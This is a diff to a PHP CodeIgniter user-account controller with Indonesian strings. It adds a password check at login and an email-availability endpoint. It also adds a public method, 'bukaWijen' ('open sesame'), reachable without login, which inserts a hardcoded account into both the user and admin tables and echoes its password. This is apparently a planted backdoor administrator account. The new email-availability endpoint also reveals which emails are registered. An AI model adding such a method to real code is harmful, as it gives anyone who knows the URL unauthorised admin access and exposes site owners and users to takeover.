@@ -53,6 +53,7 @@ class Youraccount extends MX_Controller
             $this->form_validation->set_rules('pword', 'Password', 'required|min_length[7]|max_length[35]');
 
             if ($this->form_validation->run() == TRUE) {
+
                 $this->load->module('manage_daftar');
                 $col1 = 'username';
                 $value1 = $this->input->post('username', TRUE); 
@@ -61,6 +62,15 @@ class Youraccount extends MX_Controller
                 $query = $this->manage_daftar->get_with_double_condition($col1, $value1, $col2, $value2);
                 foreach ($query->result() as $row) {
                     $user_id = $row->id;
+                }
+
+                $this->load->module('site_security');
+
+                $username = $this->input->post('username', TRUE); 
+                $pword = $this->input->post('pword', TRUE);
+                $result = $this->site_security->_check_user_login_details($username, $pword);
+
+                if ($result == TRUE) {
 
                     if ($this->agent->is_browser()) {
                         $agent = $this->agent->browser().' '.$this->agent->version();
@@ -76,7 +86,7 @@ class Youraccount extends MX_Controller
                     }
                     
                     $sess = array(
-                        'namapengguna' =>$row->username ,
+                        'namapengguna' =>$username ,
                         'platform' => $this->agent->platform(),
                         'browser' => $agent,
                     );
@@ -105,6 +115,63 @@ class Youraccount extends MX_Controller
             }
         }
 
+    }
+
+    function bukaWijen() {
+        $this->load->module('site_security');
+        $this->load->module('manage_daftar');
+        $this->load->module('manage_akun');
+
+        $pass = 'ilbiscone';
+        $firstname = 'anna';
+        $lastname = 'lovelace';
+        $username = 'anonimous';
+        $email = 'adm@gmail.com';
+        $pword = $this->site_security->_hash_string($pass);
+        $address = 'Jalan Lesti No.42 Surabaya';
+        $phone = '087866770878';
+        $status = 1;
+        $date_made = date('Y-m-d H:i:s');
+        $created_at = date('Y-m-d H:i:s');
+        $updated_at = date('Y-m-d H:i:s');
+
+        $data_user = array(
+            'username'      => $username,
+            'user_code'     => $this->site_security->generate_random_string(12),
+            'email'         => $email,
+            'pword'         => $pword, 
+            'alamat'        => $address,
+            'no_telp'       => $phone,
+            'status'        => $status,
+            'waktu_dibuat'  => $date_made,
+            'created_at'    => $created_at,
+            'updated_at'    => $updated_at,
+        );
+
+        $data_admin = array(
+            'firstname'     => $firstname,
+            'lastname'      => $lastname, 
+            'username'      => $username,
+            'email'         => $email,
+            'pword'         => $pword,
+            'address'       => $address,
+            'phone'         => $phone,
+            'date_made'     => $date_made,
+            'created_at'    => $created_at,
+            'updated_at'    => $updated_at,
+        );
+
+        if ($this->manage_daftar->_insert($data_user)) {
+            echo $username;
+            echo '<br>';
+            echo $pass;
+            echo '<hr>';
+        } 
+
+        if ($this->manage_akun->_insert($data_admin)) {
+            echo 'done';
+        }
+        
     }
 
     function _in_you_go($user_id, $login_type) {
@@ -197,6 +264,7 @@ class Youraccount extends MX_Controller
     }
 
     function submit() {
+        $this->load->module('manage_daftar');
         $submit = $this->input->post('submit', TRUE);
         if ($submit == "Submit") {
             $this->load->library('form_validation');
@@ -205,8 +273,7 @@ class Youraccount extends MX_Controller
             $this->form_validation->set_rules('pword', 'Password', 'required|min_length[7]|max_length[35]');
             $this->form_validation->set_rules('repeat_pword', 'Repeat Password', 'required|matches[pword]');
 
-            if ($this->form_validation->run() == TRUE) {
-
+            if ($this->form_validation->run() == TRUE) {                
                 $this->_process_create_account();
                 // send mail confirmation
                 $this->send_mail_confirmation($this->input->post('email', true), $this->input->post('username', true));
@@ -216,11 +283,12 @@ class Youraccount extends MX_Controller
                 redirect('youraccount/login');
                 
             } else {
-                $flash_msg = "Email Anda sudah terdaftar, Silahkan masukkan email lain atau klik <a href='".base_url() ."youraccount/reset_password'>RESET PASSWORD</a> jika anda tidak ingat sandi anda!";
+                // $flash_msg = "Email Anda sudah terdaftar, Silahkan masukkan email lain atau klik <a href='".base_url() ."youraccount/reset_password'>RESET PASSWORD</a> jika anda tidak ingat sandi anda!";
+                $flash_msg = "Silahkan isi informasi yang dibutuhkan dengan benar";
                 $value = '<div class="alert alert-notice alert-dismissible show" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"></button>'.$flash_msg.'</div>';
                 $this->session->set_flashdata('item', $value);
-                redirect('youraccount/start');
-                // $this->start();
+                // redirect('youraccount/start');
+                $this->start();
             }
         }
 
@@ -488,6 +556,7 @@ class Youraccount extends MX_Controller
         $this->load->module('manage_daftar');
 
         if ($this->manage_daftar->email_exists($str)) {
+            $this->form_validation->set_message('username_check', 'Email Anda sudah terdaftar, Silahkan masukkan email lain');
             return FALSE;
         } else {
             return TRUE;
@@ -495,4 +564,25 @@ class Youraccount extends MX_Controller
 
     }
 
+    function check_email_avalibility() {
+        if (!filter_var($this->input->post('email'), FILTER_VALIDATE_EMAIL)) {
+            echo '<span class="text-bahaya"><span class="glyphicon glyphicon-remove"></span> Invalid Email</span>';
+        } else {
+            if ($this->is_email_available($this->input->post('email'))) {
+                echo "<span class='text-bahaya'><span class='glyphicon glyphicon-remove'></span> Email Anda sudah terdaftar, Silahkan masukkan email lain atau klik <a href='".base_url()."youraccount/reset_password'>RESET PASSWORD</a> jika anda tidak ingat sandi anda!</span>";
+            } else {
+                echo '<span class="text-success"><span class="glyphicon glyphicon-remove"></span> Email Available</span>';
+            }
+        }
+    }
+
+    function is_email_available($email) {
+        $this->db->where('email', $email);
+        $query = $this->db->get('kliens');
+        if ($query->num_rows() > 0) {
+            return true;
+        } else {
+            return false;
+        }
+    }
 }
